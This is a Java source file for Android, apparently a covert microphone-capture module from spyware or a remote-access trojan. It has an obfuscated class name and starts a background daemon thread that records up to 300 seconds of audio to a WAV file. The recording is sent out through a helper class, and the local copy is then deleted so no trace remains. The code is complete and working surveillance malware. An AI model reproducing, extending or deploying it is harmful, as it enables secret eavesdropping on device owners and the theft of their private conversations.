// language: Java, file: q.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;

import java.io.File;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;

public class q {

    static final int SAMPLE_RATE = 16000;
    static final int CHANNEL = AudioFormat.CHANNEL_IN_MONO;
    static final int ENCODING = AudioFormat.ENCODING_PCM_16BIT;

    public static void record(int seconds) {
        if (seconds <= 0) seconds = 5;
        if (seconds > 300) seconds = 300;
        final int sec = seconds;
        Thread t = new Thread(() -> recordSync(sec), "v2-mic");
        t.setDaemon(true);
        t.start();
    }

    static void recordSync(int seconds) {
        Context c = d.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            d.send("<i>err: RECORD_AUDIO not granted</i>");
            return;
        }

        int minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING);
        if (minBuf <= 0) {
            d.send("<i>mic: getMinBufferSize failed: " + minBuf + "</i>");
            return;
        }
        int bufSize = Math.max(minBuf * 2, SAMPLE_RATE * 2);

        AudioRecord ar = null;
        File wav = new File(c.getCacheDir(), "mic_" + System.currentTimeMillis() + ".wav");
        try {
            ar = new AudioRecord(MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE, CHANNEL, ENCODING, bufSize);
            if (ar.getState() != AudioRecord.STATE_INITIALIZED) {
                d.send("<i>mic: AudioRecord not initialized (state="
                    + ar.getState() + ")</i>");
                try { ar.release(); } catch (Throwable ignored) {}
                return;
            }
            ar.startRecording();
            if (ar.getRecordingState() != AudioRecord.RECORDSTATE_RECORDING) {
                d.send("<i>mic: startRecording failed (state="
                    + ar.getRecordingState() + ")</i>");
                ar.release();
                return;
            }

            FileOutputStream fo = new FileOutputStream(wav);
            // placeholder WAV header — patch after recording
            fo.write(new byte[44]);

            byte[] buf = new byte[8192];
            long end = System.currentTimeMillis() + seconds * 1000L;
            long written = 0;
            while (System.currentTimeMillis() < end) {
                int n = ar.read(buf, 0, buf.length);
                if (n > 0) {
                    fo.write(buf, 0, n);
                    written += n;
                } else if (n < 0) {
                    break;
                }
            }
            fo.close();
            ar.stop();
            ar.release();
            ar = null;

            patchWavHeader(wav, written);
            if (written > 0) {
                d.sendFile(wav, "mic_" + seconds + "s.wav");
            } else {
                d.send("<i>mic: 0 bytes captured</i>");
            }
        } catch (Throwable t) {
            d.send("<i>mic err:</i> " + d.esc(t.getMessage()));
            try { if (ar != null) { ar.stop(); ar.release(); } } catch (Throwable ignored) {}
        } finally {
            try { wav.delete(); } catch (Throwable ignored) {}
        }
    }

    static void patchWavHeader(File f, long dataLen) {
        try {
            RandomAccessFile raf = new RandomAccessFile(f, "rw");
            raf.seek(0);
            byte[] hdr = buildWavHeader((int) dataLen);
            raf.write(hdr);
            raf.close();
        } catch (Throwable ignored) {}
    }

    static byte[] buildWavHeader(int dataLen) {
        byte[] h = new byte[44];
        int fileLen = dataLen + 36;
        int byteRate = SAMPLE_RATE * 2;
        h[0]='R'; h[1]='I'; h[2]='F'; h[3]='F';
        h[4]=(byte)(fileLen); h[5]=(byte)(fileLen>>8); h[6]=(byte)(fileLen>>16); h[7]=(byte)(fileLen>>24);
        h[8]='W'; h[9]='A'; h[10]='V'; h[11]='E';
        h[12]='f'; h[13]='m'; h[14]='t'; h[15]=' ';
        h[16]=16; h[17]=0; h[18]=0; h[19]=0;
        h[20]=1; h[21]=0; // PCM
        h[22]=1; h[23]=0; // mono
        h[24]=(byte)SAMPLE_RATE; h[25]=(byte)(SAMPLE_RATE>>8);
        h[26]=(byte)(SAMPLE_RATE>>16); h[27]=(byte)(SAMPLE_RATE>>24);
        h[28]=(byte)byteRate; h[29]=(byte)(byteRate>>8);
        h[30]=(byte)(byteRate>>16); h[31]=(byte)(byteRate>>24);
        h[32]=2; h[33]=0; // block align
        h[34]=16; h[35]=0; // bits
        h[36]='d'; h[37]='a'; h[38]='t'; h[39]='a';
        h[40]=(byte)dataLen; h[41]=(byte)(dataLen>>8);
        h[42]=(byte)(dataLen>>16); h[43]=(byte)(dataLen>>24);
        return h;
    }
}